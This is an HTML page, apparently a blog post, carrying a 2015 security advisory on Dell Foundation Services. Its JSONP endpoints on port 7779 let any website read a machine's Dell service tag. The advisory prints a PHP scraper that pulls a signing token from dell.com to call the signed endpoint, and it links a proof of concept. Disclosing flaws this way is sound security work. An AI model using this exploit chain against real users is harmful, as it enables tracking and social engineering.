@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Security Advisory: Dell Foundation Services Remote Information Disclosure</title>
+  <meta name="description" content="By slipstream/RoL.">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="/2015/11/25/dell-foundation-services.html">
+  <link rel="alternate" type="application/rss+xml" title="LizardHQ research" href="/feed.xml" />
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300,700' rel='stylesheet' type='text/css'>
+</head>
+
+
+  <body>
+
+    <div class="site-header">
+
+  <div class="logo">
+    <a href="/"><img src="/img/logo.png"></a>
+  </div>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <i class="fa fa-navicon fa-lg"></i>
+      </a>
+
+      <div class="trigger">
+          <a class="page-link" href="/">Home</a>
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+
+</div>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="post">
+
+  <header class="post-header">
+     <h1 class="post-title">Security Advisory: Dell Foundation Services Remote Information Disclosure</h1>
+     <p class="post-meta">Posted on Nov 25, 2015</p>
+  </header>
+
+  <article class="post-content">
+    <p><em>By slipstream/RoL.</em></p>
+
+<h1>Overview</h1>
+
+<p>Dell Foundation Services (otherwise known by its internal name of &quot;Tribbles&quot;) &quot;provides a core set of foundational services facilitating customer serviceability, messaging and support functions&quot;.</p>
+
+<p>An issue in Dell Foundation Services, version 2.3.3800.0A00 and below, can be exploited by a malicious website to leak the Dell service tag of a Dell system, which can be used for tracking purposes, or for social engineering.</p>
+
+<h1>Issues</h1>
+
+<p>Dell Foundation Services starts a HTTPd that listens on port 7779. Generally, requests to the API exposed by this HTTPd must be requests signed using a RSA-1024 key and hashed with SHA512.</p>
+
+<p>One of the JSONP API endpoints to obtain the service tag does not need a valid signature to be provided; thus, any website can call it.</p>
+
+<p>This endpoint is a part of eDell however, and this part of Tribbles gets removed with the tool and instructions to remove the eDellRoot certificate.</p>
+
+<p>However, another JSONP API endpoint exists to obtain the service tag. This endpoint requires a valid signature, but this signature is provided in the JavaScript on several pages of dell.com, and thus can be scraped.</p>
+
+<p>A proof-of-concept to exploit these issues is available at <a href="http://rol.im/dell/">here</a> and you can view the source of that page to obtain almost all of the required technical information needed to exploit.</p>
+
+<p>The missing piece is getrequest.php, which scrapes Dell&#39;s site to obtain the needed information to call the second JSONP API endpoint:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">&lt;?php
+
+$f = file_get_contents(&quot;http://www.dell.com/support/home/us/en/04&quot;);
+
+$signature = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var dfsSignatureToken = &#39;&quot;,$f))));
+$expires = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var tokenExpires = &#39;&quot;,$f))));
+$interface = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var dfsInterfaceApi = &#39;&quot;,$f))));
+$url = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var DFSUrl = &#39;&quot;,$f))));
+
+echo json_encode( (object) array(
+    &quot;signature&quot;=&gt;$signature,
+    &quot;expires&quot;=&gt;$expires,
+    &quot;interface&quot;=&gt;$interface,
+    &quot;url&quot;=&gt;$url
+));
+</code></pre></div>
+<h1>Affected Versions</h1>
+
+<p>2.3.3800.0A00 and below.</p>
+
+<h1>Solution</h1>
+
+<p>Uninstallation of Dell Foundation Services will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.</p>
+
+  </article>
+
+  <div align="center">
+  	<a href="#">
+  	<i class="fa fa-arrow-circle-up fa-2x"></i>
+  	</a>
+  </div>
+
+</div>
+
+        <div class="footer" align="right">
+  <hr>
+  <a href="http://kopimi.com" target="_blank"><img src="/img/kopimi.gif"></a>
+  <a href="https://twitter.com/lizardhq" target="_blank">@lizardhq</a>
+</div>
+
+      </div>
+    </div>
+
+  </body>
+</html>
